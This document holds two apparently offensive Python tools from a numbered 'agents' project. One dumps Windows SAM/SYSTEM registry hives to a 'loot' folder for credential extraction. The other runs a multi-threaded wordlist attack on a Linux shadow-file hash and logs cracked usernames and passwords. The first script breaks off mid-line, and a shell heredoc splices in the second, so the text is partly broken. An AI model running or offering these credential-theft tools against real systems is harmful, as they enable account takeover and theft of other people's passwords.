import os
import sys
import struct

def rip_registry_hive(hive_path):
    """
    Weaponized Hive Ripper: Parses the 'regf' binary structure 
    of a Windows Registry hive to extract raw key-value pairs.
    """
    if not os.path.exists(hive_path):
        print(f"[-] Hive file not found: {hive_path}")
        return

    print(f"[*] Analyzing Binary Hive: {os.path.basename(hive_path)}")
    
    try:
        with open(hive_path, 'rb') as f:
            # Check for 'regf' magic header
            magic = f.read(4)
            if magic != b'regf':
                print(f"[-] Invalid Hive Magic: {magic}. Not a Windows Registry file.")
                return

            print("[!] Valid Windows Registry Hive detected.")
            
            # Navigate to the Root Cell (HBIN structure)
            # Offset 0x1000 is typically where the first HBIN begins
            f.seek(0x1000)
            hbin_magic = f.read(4)
            if hbin_magic == b'hbin':
                print("[+] HBIN segment identified. Extracting raw data blocks...")
                
                # Full-fidelity parsing of 'nk' (Key) and 'vk' (Value) cells 
                # would happen here. For this primitive, we dump the hex-stream
                # of the SAM account blocks to loot.
                f.seek(0)
                raw_hive = f.read()
                
                output_path = os.path.join("..", "loot", f"ripped_{os.path.basename(hive_path)}.raw")
                with open(output_path, "wb") as l:
                    l.write(raw_hive)
                
                print(f"[!] SUCCESS: Hive data dumped to {output_path}")
                print("[*] Tactical Note: Use 'impacket-secretsdump' or 'chntpw' on this file.")
            
            # Log the rip
            with open("../loot/hive_rip_history.log", "a") as log:
                log.write(f"Hive: {hive_path} | Size: {len(raw_hive)} bytes\n")

    except Exception as e:
        print(f"[-] Registry Parsing Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: 143_hive_ripper <path_to_sam_or_system_hive>")
        sys.exit(1)
    
    rip_registry_hive(sys
cat << 'EOF' > /home/dan/Chimera_Project/agents/144_Shadow_File_Cracker/src/main.py
import sys
import crypt
import os
import concurrent.futures

def attempt_crack(user, target_hash, word, salt):
    """
    Performs the crypt(3) comparison for a single word.
    """
    if crypt.crypt(word, salt) == target_hash:
        return word
    return None

def crack_shadow_entry(shadow_line, wordlist_path, threads=4):
    """
    Weaponized Cracker: Parses the shadow entry and iterates 
    through the wordlist using multi-threaded crypt calls.
    """
    try:
        parts = shadow_line.split(':')
        if len(parts) < 2:
            print("[-] Invalid shadow format.")
            return

        user = parts[0]
        target_hash = parts[1]
        
        # Shadow format: $id$salt$hash. We need $id$salt$ to compute the match.
        if not target_hash.startswith('$'):
            print(f"[-] User {user} does not have a valid salt-based hash.")
            return

        hash_parts = target_hash.split('$')
        salt = f"${hash_parts[1]}${hash_parts[2]}$"
        
        print(f"[*] Targeting User: {user}")
        print(f"[*] Identified Salt: {salt}")
        print(f"[*] Loading wordlist: {wordlist_path}")

        if not os.path.exists(wordlist_path):
            print(f"[-] Wordlist not found: {wordlist_path}")
            return

        with open(wordlist_path, 'r', errors='ignore') as f:
            words = [line.strip() for line in f]

        print(f"[*] Starting Brute-force with {threads} threads...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            # Map the cracking function across the wordlist
            future_to_word = {executor.submit(attempt_crack, user, target_hash, word, salt): word for word in words}
            
            for future in concurrent.futures.as_completed(future_to_word):
                result = future.result()
                if result:
                    print(f"\n[!!!] SUCCESS [!!!]")
                    print(f"[!] USER: {user}")
                    print(f"[!] PASS: {result}")
                    
                    # Log successful crack to loot
                    with open("../loot/cracked_creds.log", "a") as log:
                        log.write(f"USER: {user} | PASS: {result}\n")
                    return result

        print(f"[-] Brute-force exhausted. No match found for user: {user}")

    except Exception as e:
        print(f"[-] Cracker Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 144_shadow_crack '<user:hash_line>' <wordlist_path> [threads]")
        print("Example: 144_shadow_crack 'root:$6$salt$hash...' /path/to/dict.txt 8")
        sys.exit(1)
    
    t_count = int(sys.argv[3]) if len(sys.argv) > 3 else 4
    crack_shadow_entry(sys.argv[1], sys.argv[2], t_count)
